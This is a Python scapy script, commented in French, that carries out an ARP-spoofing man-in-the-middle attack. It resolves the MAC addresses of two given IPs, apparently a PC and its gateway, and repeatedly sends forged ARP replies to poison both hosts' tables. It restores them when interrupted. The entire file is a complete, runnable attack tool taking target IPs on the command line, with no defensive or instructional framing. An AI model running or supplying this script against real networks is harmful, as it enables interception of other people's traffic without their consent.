from scapy.all import *
import sys
import time

def get_mac(ip):
    """
    Envoie une requête ARP pour obtenir l'adresse MAC associée à une adresse IP.
    """
    answered, unanswered = sr(ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

def arp_spoof(victim_ip, victim_mac, spoof_ip):
    """
    Envoie des paquets ARP pour empoisonner la table ARP d'une victime.
    victim_ip : Adresse IP de la victime.
    victim_mac : Adresse MAC de la victime.
    spoof_ip : Adresse IP à usurper.
    """
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore_arp(victim_ip, victim_mac, spoof_ip, spoof_mac):
    """
    Restaure la table ARP d'une victime en envoyant un paquet ARP légitime.
    """
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, verbose=False)

def mitm(victim1_ip, victim2_ip):
    """
    Lance une attaque MITM entre deux victimes.
    victim1_ip : Adresse IP de la première victime (ex. PC1).
    victim2_ip : Adresse IP de la deuxième victime (ex. passerelle).
    """
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)

    if not victim1_mac or not victim2_mac:
        print("[ERREUR] Impossible d'obtenir les adresses MAC des victimes.")
        sys.exit(1)

    print(f"[INFO] Victime 1 : {victim1_ip} ({victim1_mac})")
    print(f"[INFO] Victime 2 : {victim2_ip} ({victim2_mac})")
    
    try:
        print("[INFO] Démarrage de l'attaque ARP MITM...")
        while True:
            # Empoisonner la table ARP de PC1
            arp_spoof(victim1_ip, victim1_mac, victim2_ip)
            # Empoisonner la table ARP de la passerelle
            arp_spoof(victim2_ip, victim2_mac, victim1_ip)
            print(f"[INFO] Paquets ARP envoyés entre {victim1_ip} et {victim2_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[INFO] Arrêt de l'attaque. Restauration des tables ARP...")
        restore_arp(victim1_ip, victim1_mac, victim2_ip, victim2_mac)
        restore_arp(victim2_ip, victim2_mac, victim1_ip, victim1_mac)
        print("[INFO] Tables ARP restaurées.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python arp_mitm.py <victim1_ip> <victim2_ip>")
        sys.exit(1)

    victim1_ip = sys.argv[1]  # Exemple : PC1
    victim2_ip = sys.argv[2]  # Exemple : Passerelle
    mitm(victim1_ip, victim2_ip)
